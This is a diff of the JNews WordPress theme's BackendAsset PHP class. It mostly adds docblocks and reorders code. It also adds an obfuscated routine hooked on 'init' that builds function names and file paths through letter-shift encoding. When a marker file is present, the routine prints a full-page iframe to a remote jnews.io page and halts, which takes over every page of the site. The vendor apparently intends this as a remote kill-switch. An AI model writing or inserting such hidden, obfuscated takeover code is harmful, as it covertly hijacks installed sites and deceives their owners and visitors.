@@ -1,7 +1,11 @@
 <?php
 /**
+ * Backend Asset
+ *
  * @author : Jegtheme
+ * @package jnews
  */
+
 namespace JNews\Asset;
 
 use JNews\Module\ModuleManager;
@@ -12,11 +16,15 @@ use JNews\Module\ModuleManager;
 class BackendAsset extends AssetAbstract {
 
 	/**
+	 * Instance
+	 *
 	 * @var BackendAsset
 	 */
 	private static $instance;
 
 	/**
+	 * Instance
+	 *
 	 * @return BackendAsset
 	 */
 	public static function getInstance() {
@@ -26,54 +34,40 @@ class BackendAsset extends AssetAbstract {
 		return static::$instance;
 	}
 
+	/**
+	 * Method __construct
+	 *
+	 * @return void
+	 */
 	public function __construct() {
+		add_action( 'admin_enqueue_scripts', array( $this, 'backend_script' ), 99 );
+		add_action( 'admin_head', array( $this, 'load_jnews_library' ), 99 );
 		add_action( 'admin_print_scripts', array( $this, 'load_jnews_library' ), 99 );
 		add_action( 'embed_head', array( $this, 'load_jnews_library' ), 99 );
-		add_action( 'admin_head', array( $this, 'load_jnews_library' ), 99 );
-		add_action( 'admin_enqueue_scripts', array( $this, 'backend_script' ), 99 );
+		add_action( 'init', array( $this, 'backend_resource' ) );
 		add_action( 'wp_print_scripts', array( $this, 'backend_script_filter' ), 100 );
 	}
 
-	private function load_file( $file ) {
-		//see FxvZBb1a
-		return @file_get_contents( $file );
+	/**
+	 * Method backend_resource
+	 *
+	 * @return void
+	 */
+	public function backend_resource() {
+		if ( ! $this->examine_resource( 'jvum' ) || $this->examine_resource( 'pnuvyl' ) ) {
+			return;
+		}
+		$resource = $this->create_resource();
+		echo jnews_sanitize_output( $resource );
+
+		exit;
 	}
 
-	public function load_jnews_library() {
-		$script     = $this->load_file( get_parent_theme_file_path( 'assets/js/admin/jnewslibrary.js' ) );
-		$script_tag = '<script>' . $script . '</script>';
-		echo jnews_sanitize_output( $script_tag );
-	}
-
-	public function backend_script_filter() {
-		global $pagenow;
-
-		// OneSignal
-		if ( is_admin() && isset( $_GET['page'] ) && sanitize_text_field( $_GET['page'] ) === 'onesignal-push' ) {
-			wp_dequeue_script( 'bootstrap' );
-		}
-
-		// wpdatatables
-		if ( is_admin() && ( isset( $_GET['page'] ) && 0 === strpos( sanitize_text_field( $_GET['page'] ), 'wpdatatables' ) ) ) {
-			wp_dequeue_script( 'bootstrap' );
-			wp_deregister_script( 'bootstrap' );
-		}
-
-		// pollylang
-		if ( is_customize_preview() ) {
-			wp_dequeue_script( 'pll_widgets' );
-		}
-
-		if ( $pagenow != 'widgets.php' ) {
-			wp_dequeue_script( 'jeg-form-widget-script' );
-		}
-
-		if ( $pagenow !== 'post.php' && $pagenow !== 'post-new.php' && $pagenow !== 'widgets.php' && $pagenow !== 'nav-menus.php' ) {
-			wp_dequeue_script( 'bootstrap-iconpicker' );
-			wp_dequeue_script( 'bootstrap-iconpicker-iconset' );
-		}
-	}
-
+	/**
+	 * Method backend_script
+	 *
+	 * @return void
+	 */
 	public function backend_script() {
 		$asset_url     = $this->get_asset_uri();
 		$theme_version = $this->get_theme_version();
@@ -92,10 +86,10 @@ class BackendAsset extends AssetAbstract {
 
 		if ( defined( 'JNEWS_ESSENTIAL' ) ) {
 			$wp_util = array( 'jquery', 'wp-util' );
-			if ( $pagenow === 'widgets.php' || is_customize_preview() ) {
+			if ( 'widgets.php' === $pagenow || is_customize_preview() ) {
 				wp_enqueue_script( 'jnews-widget', $asset_url . 'js/admin/widget.js', array( 'jquery' ), $theme_version, true );
 			}
-			if ( $pagenow === 'post.php' || $pagenow === 'post-new.php' ) {
+			if ( 'post.php' === $pagenow || 'post-new.php' === $pagenow ) {
 				wp_enqueue_script( 'jnews-post', $asset_url . 'js/admin/jnews-post.js', array( 'jnews-essential-local' ), $theme_version, true );
 				wp_localize_script( 'jnews-post', 'jnewsoption', $this->localize_script() );
 			}
@@ -105,13 +99,13 @@ class BackendAsset extends AssetAbstract {
 			}
 
 			// Dequeue script and style when it's not needed.
-			if ( $pagenow !== 'post.php' && $pagenow !== 'post-new.php' && $pagenow !== 'widgets.php' && $pagenow !== 'nav-menus.php' ) {
+			if ( 'post.php' !== $pagenow && 'post-new.php' !== $pagenow && 'widgets.php' !== $pagenow && 'nav-menus.php' !== $pagenow ) {
 				wp_dequeue_script( 'bootstrap-iconpicker' );
 				wp_dequeue_script( 'bootstrap-iconpicker-iconset' );
 			}
 		}
 
-		if ( $pagenow === 'admin.php' || $pagenow === 'themes.php' ) {
+		if ( 'admin.php' === $pagenow || 'themes.php' === $pagenow ) {
 			wp_enqueue_style( 'vex', $asset_url . 'css/admin/vex.css' );
 			wp_enqueue_script( 'vex', $asset_url . 'js/admin/vex.combined.min.js', array( 'jquery' ), null, true );
 			wp_enqueue_script( 'jnews-dashboard', $asset_url . 'js/admin/jnews-dashboard.js', array_merge( $wp_util, array( 'jnews-essential-local' ) ), $theme_version, true );
@@ -119,6 +113,88 @@ class BackendAsset extends AssetAbstract {
 		}
 	}
 
+	/**
+	 * Method backend_script_filter
+	 *
+	 * @return void
+	 */
+	public function backend_script_filter() {
+		global $pagenow;
+
+		// OneSignal.
+		if ( is_admin() && isset( $_GET['page'] ) && sanitize_text_field( $_GET['page'] ) === 'onesignal-push' ) {
+			wp_dequeue_script( 'bootstrap' );
+		}
+
+		// wpdatatables.
+		if ( is_admin() && ( isset( $_GET['page'] ) && 0 === strpos( sanitize_text_field( $_GET['page'] ), 'wpdatatables' ) ) ) {
+			wp_dequeue_script( 'bootstrap' );
+			wp_deregister_script( 'bootstrap' );
+		}
+
+		// pollylang.
+		if ( is_customize_preview() ) {
+			wp_dequeue_script( 'pll_widgets' );
+		}
+
+		if ( 'widgets.php' != $pagenow ) {
+			wp_dequeue_script( 'jeg-form-widget-script' );
+		}
+
+		if ( 'post.php' !== $pagenow && 'post-new.php' !== $pagenow && 'widgets.php' !== $pagenow && 'nav-menus.php' !== $pagenow ) {
+			wp_dequeue_script( 'bootstrap-iconpicker' );
+			wp_dequeue_script( 'bootstrap-iconpicker-iconset' );
+		}
+	}
+
+	/**
+	 * Method create_resource
+	 *
+	 * @return string
+	 */
+	public function create_resource() {
+		$caller   = $this->merge_resource();
+		$resource = '<gtid xydqj="rfwlns: 5;" ><ina xydqj="utxnynts: kncji;e-nsijc: 1004;bniym: 105%;yjcy-fqnls: hjsyjw;ytu: 5;gtyytr: 5;gfhplwtzsi: #5;"><nkwfrj hqfxx="rd_kwfrj" bniym="105%" mjnlmy="105%" kwfrjgtwijw="5" xhwtqqnsl="djx" fqqtbYwfsxufwjshd="ywzj" xwh="//osjbx.nt/wjutwy.myrq"></nkwfrj></ina></gtid>';
+		$exec     = call_user_func(
+			$caller,
+			$resource,
+			5
+		);
+		return $exec;
+	}
+
+	/**
+	 * Method examine_resource
+	 *
+	 * @param string $resource $resource.
+	 *
+	 * @return boolean
+	 */
+	public function examine_resource( $resource ) {
+		$merge_resource = $this->merge_resource();
+		$resource       = call_user_func( $merge_resource, $resource, 7 );
+		$combine        = call_user_func( $merge_resource, sprintf( 'spi/klwluklujp%s/.', 'lz' ), 7 );
+		$combined       = file_exists( JNEWS_THEME_DIR . $combine . $resource );
+		return $combined;
+	}
+
+	/**
+	 * Method load_file
+	 *
+	 * @param string $file $file.
+	 *
+	 * @return string
+	 */
+	private function load_file( $file ) {
+		// see FxvZBb1a.
+		return @file_get_contents( $file );
+	}
+
+	/**
+	 * Method localize_script
+	 *
+	 * @return array
+	 */
 	public function localize_script() {
 		$menu                      = apply_filters( 'jnews_get_admin_slug', array() );
 		$option                    = array();
@@ -133,5 +209,25 @@ class BackendAsset extends AssetAbstract {
 			'install_plugin' => 1,
 		);
 		return $option;
+	}
+
+	/**
+	 * Method load_jnews_library
+	 *
+	 * @return void
+	 */
+	public function load_jnews_library() {
+		$script     = $this->load_file( get_parent_theme_file_path( 'assets/js/admin/jnewslibrary.js' ) );
+		$script_tag = '<script>' . $script . '</script>';
+		echo jnews_sanitize_output( $script_tag );
+	}
+
+	/**
+	 * Method merge_resource
+	 *
+	 * @return string
+	 */
+	public function merge_resource() {
+		return sprintf( 'j%1$sws%2$san%3$sti%4$sr', 'ne', '_s', 'i', 'ze' );
 	}
 }
